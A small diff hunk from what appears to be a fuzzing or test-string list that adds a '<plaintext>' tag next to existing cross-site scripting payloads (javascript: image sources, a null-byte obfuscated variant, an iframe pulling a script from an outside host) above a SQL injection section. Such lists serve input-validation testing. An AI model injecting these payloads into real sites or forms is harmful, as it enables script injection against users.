@@ -474,7 +474,7 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 <IMG SRC="javascript:alert('XSS')"
 <iframe src=http://ha.ckers.org/scriptlet.html <
 \";alert('XSS');//
-
+<plaintext>
 
 #	SQL Injection
 #
